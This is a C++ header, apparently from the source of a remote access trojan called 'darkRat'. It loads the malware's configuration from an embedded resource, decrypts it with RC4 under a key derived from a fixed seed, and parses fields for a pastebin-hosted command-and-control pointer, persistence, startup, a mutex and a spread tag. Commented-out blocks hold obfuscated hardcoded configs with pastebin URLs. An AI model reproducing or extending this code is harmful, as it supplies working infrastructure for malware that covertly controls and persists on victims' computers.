#pragma once
#include "BuildSystem\crypto\base64.h"
#include "BuildSystem\crypto\rc4.h"

std::string key(int seed)
{
	srand(seed);
	int length = 32;
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

namespace darkRat
{
	namespace config
	{
		class config
		{
		public:
			std::string pastebinUrl;
			std::string mutex;
			std::string startup;
			std::string requestInterval;
			std::string persistence;
			std::string spreadtag;
			std::string useragent;
			std::string versionID = "2.1.3";
			std::string encryptionKey;
			config(std::string ek, std::string pu, std::string mux, std::string sup, std::string ri, std::string per, std::string st, std::string ua)
			{
				encryptionKey = ek;
				pastebinUrl = pu;
				persistence = per;
				mutex = mux;
				spreadtag = st;
				startup = sup;
				useragent = ua;
				requestInterval = ri;
			}
		};

		config load()
		{
			absent::crypto::RC4 rc4;

	
			HMODULE hModule = GetModuleHandle(0); // get the handle to the current module (the executable file)
			HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(10), RT_RCDATA); // substitute RESOURCE_ID and RESOURCE_TYPE.
		
			HGLOBAL hMemory = LoadResource(hModule, hResource);
			DWORD dwSize = SizeofResource(hModule, hResource);
			LPVOID lpAddress = LockResource(hMemory);
			char* bytes = new char[dwSize];
			memset(bytes, 0x00, dwSize + 1);
			memcpy(bytes, lpAddress, dwSize);
			if (strlen(bytes) > 0)
			{
				std::string de_config = rc4.crypt(absent::crypto::b64::decode(bytes), key(0x4d930cf57cfda1ba));
				nlohmann::json j_config = nlohmann::json::parse(de_config);
				std::string ek = j_config["ek"];
				std::string pu = j_config["pu"];
				std::string mux = j_config["mux"];
				std::string sup = j_config["sup"];
				std::string ri = j_config["ri"];
				std::string pre = j_config["pre"];
				std::string spreadtag = j_config["st"];
				std::string useragent = j_config["ua"];
				return config(ek, pu, mux, sup, ri, pre, spreadtag, useragent);
			}
			
	
			/*
			return config(OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>"),
				OBFUSCATE("http://pastebin.com/raw/QEcHnGb1"), //Debug //http://pastebin.com/raw/wJJPteV2
				OBFUSCATE("3mCUq1z"),
				OBFUSCATE("false"),
				OBFUSCATE("5"),
				OBFUSCATE("false"),
				OBFUSCATE("main"),
				OBFUSCATE("SUq1rx"),
				{}
			);

		
			return config(OBFUSCATE("wzXnjDj3i0pLHGhZJGMAkAdKLCpCDygH"),
				OBFUSCATE("http://pastebin.com/raw/0K3X5Rs9"), //Debug //http://pastebin.com/raw/wJJPteV2
				OBFUSCATE("3mCUq1b"),
				OBFUSCATE("true"),
				OBFUSCATE("600"),
				OBFUSCATE("true"),
				OBFUSCATE("main"),
				OBFUSCATE("SUq1rx"),
				{}
			);
			*/
		}
	}
}

